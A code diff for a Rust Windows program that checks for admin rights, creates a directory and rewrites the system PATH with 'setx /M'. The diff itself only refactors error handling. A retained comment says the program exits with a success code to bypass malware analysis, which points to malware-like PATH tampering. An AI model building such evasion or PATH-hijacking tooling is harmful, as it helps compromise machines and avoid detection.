@@ -1,4 +1,4 @@
-use std::process::{self, Command, Stdio};
+use std::process::{Command, Stdio, exit};
 use std::path::{Path};
 use std::fs::{File};
 use std::io::{self, Write};
@@ -187,13 +187,16 @@ fn set_system_path_first() -> io::Result<()> {
     // Note: setx has a limit on the length of the variable (typically 1024 characters)
     let output = Command::new("setx")
         .args(&["/M", "PATH", &sanitized_path])
-        .output()
-        .expect("Failed to execute setx command");
+        .output();
 
-    if !output.status.success() {
-        eprintln!("Error updating system PATH: {:?}", output);
+    if let Ok(output) = output {
+        if output.status.success() {
+            println!("[+] PATH successfully updated.");
+        } else {
+            eprintln!("Error updating system PATH: {:?}", output);
+        }
     } else {
-        println!("[+] PATH successfully updated.");
+        eprintln!("Failed to execute setx command.");
     }
 
     Ok(())
@@ -224,7 +227,7 @@ fn main() {
     // Step 1: Admin Control Check
     if !is_admin() {
         eprintln!("You need administrator privileges to run this program.");
-        process::exit(0); // Exit the program with a success status
+        exit(0); // Exit the program with a success status
     }
 
     println!("Admin privileges confirmed.");
@@ -233,7 +236,7 @@ fn main() {
     if let Err(e) = create_directory() {
         // Handle the error if the directory creation fails
         eprintln!("Error creating directory: {}", e);
-        process::exit(0); // Exit the program with an success code to bypass malware analysis
+        exit(0); // Exit the program with an success code to bypass malware analysis
     } else {
         // Directory creation was successful
         println!("Directory was created without any issues.");
